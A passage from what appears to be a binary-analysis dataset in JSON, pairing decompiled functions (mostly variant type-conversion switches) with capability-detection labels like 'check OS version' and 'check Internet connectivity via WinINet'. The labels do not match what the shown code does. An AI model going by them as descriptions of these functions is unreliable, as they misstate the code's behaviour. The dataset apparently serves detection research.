            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411b18(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00411b18();\n        }\n        else {\n    // switch table (21 cases) at 0x411b5d\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x4a1a54 != '\\0')) {\n                    fcn.00410c3c();\n                }\n                else {\n                    fcn.00411420();\n                }\n                break;\n            case 1:\n                fcn.00411188();\n                break;\n            case 2:\n                fcn.00412488();\n                fcn.00415768();\n                break;\n            case 3:\n                fcn.00411edc();\n                fcn.004156c8();\n                break;\n            case 4:\n                fVar1 = fcn.00413830();\n                fcn.004157b4(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.004134b8();\n                fcn.004157d8(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.00414170();\n                fcn.00415804(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00413c08();\n                fcn.00415830(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.004118fc();\n                break;\n            case 9:\n                fcn.00411994();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00411948();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.00410c3c();\n                }\n                else {\n                    fcn.00411aac();\n                }\n                break;\n            case 0xb:\n                fcn.00412fa4();\n                fcn.0041585c();\n                break;\n            case 0xd:\n                fcn.004119e0();\n                break;\n            case 0x10:\n                fcn.0041232c();\n                fcn.00415748();\n                break;\n            case 0x11:\n                fcn.004123e0();\n                fcn.004156e8();\n                break;\n            case 0x12:\n                fcn.00412580();\n                fcn.00415708();\n                break;\n            case 0x13:\n                fcn.0041265c();\n                fcn.00415728();\n                break;\n            case 0x14:\n                uVar2 = fcn.004129ac();\n                fcn.00415788(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.0041184c();\n    return;\n}\n",
        "token_count": 714
    },
    "00411edc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00411edc(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4122fd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x411f0f\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.00410c3c();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411d44();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411df8();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411d44();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411e34();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.00411e98();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.00411df8();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412133\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411df8();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411d44();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411edc();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404508();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404508();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411edc();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00404508();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.00404508();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1828
    },
    "0041232c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041232c(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x4a1a54 != '\\0') {\n            puStack24 = 0x41236c;\n            fcn.00410c3c();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x4123ba;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00411edc();\n        if (0xff < uVar2 + 0x80) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "004123e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004123e0(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x4a1a54 != '\\0') {\n            puStack24 = 0x412420;\n            fcn.00410c3c();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x412465;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00411edc();\n        if (0xff < uVar2) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "00412488": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412488(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (18 cases) at 0x4124c1\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack24 = 0x4124fa;\n            fcn.00410c3c();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x41255d;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.00411edc();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 351
    },
    "00412580": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412580(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (19 cases) at 0x4125b6\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack24 = 0x4125e8;\n            fcn.00410c3c();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x412636;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.00411edc();\n        if (0xffff < uVar1) {\n            fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 324
    },
    "0041265c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041265c(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (20 cases) at 0x412697\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack24 = 0x4126d0;\n            fcn.00410c3c();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x412722;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004129ac();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.00404508();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 369
    },
    "004129ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.004129ac(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x412db8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4129df\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.00410c3c();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403440();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.004127f4();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412748();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.004127f4();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.004128f4();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00412960();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.00412748();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412c03\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412748();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403440();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.004127f4();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.004129ac();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.004129ac();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1245
    },
    "00412fa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00412fa4(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    bool bVar4;\n    uint32_t uStack8;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412fbe\n    switch(uVar1) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            fcn.00410c3c();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4132f4;\n        break;\n    case 5:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4132f4;\n        break;\n    case 6:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4132f4;\n        break;\n    case 7:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x4132f4;\n        break;\n    case 8:\n        uVar2 = fcn.00412df0();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 9:\n    case 0xd:\n        uVar2 = fcn.00412eb4();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            uVar2 = fcn.00412df0();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if (uVar1 == 0x101) {\n            uVar2 = fcn.00412ef4();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar3 = fcn.00412f58();\n            uStack8 = param_1;\n            if (cVar3 == '\\0') {\n                uVar2 = fcn.00412eb4();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413184\n            switch(uVar1 & 0xbfff) {\n            default:\n                uVar2 = fcn.00412eb4();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 2:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 3:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 4:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4132f4;\n                break;\n            case 5:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4132f4;\n                break;\n            case 6:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4132f4;\n                break;\n            case 7:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x4132f4;\n                break;\n            case 8:\n                uVar2 = fcn.00412df0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0xb:\n                uStack8 = param_1 & 0xffffff00 | 1 - (**(in_EAX + 4) == 0);\n                break;\n            case 0xc:\n                uVar2 = fcn.00412fa4();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0x10:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x11:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x12:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x13:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x14:\n                bVar4 = (*(in_EAX + 4))[1] == 0;\n                if (bVar4) {\n                    bVar4 = **(in_EAX + 4) == 0;\n                }\n                uStack8 = param_1 & 0xffffff00 | !bVar4;\n            }\n        }\n        break;\n    case 0xb:\n        uStack8 = param_1 & 0xffffff00 | 1 - (in_EAX[4] == 0);\n        break;\n    case 0xc:\n        uVar2 = fcn.00412fa4();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar4 = *(in_EAX + 6) == 0;\n        if (bVar4) {\n            bVar4 = *(in_EAX + 4) == 0;\n        }\n        uStack8 = param_1 & 0xffffff00 | !bVar4;\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 1614
    },
    "004134b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004134b8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4134d4\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            fcn.00410c3c();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x41382c;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.004132f8();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.004133bc();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.004132f8();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.00413408();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.0041346c();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.004133bc();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4136b0\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.004133bc();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x41382c;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.004132f8();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.004134b8();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.004134b8();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1066
    },
    "00413830": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
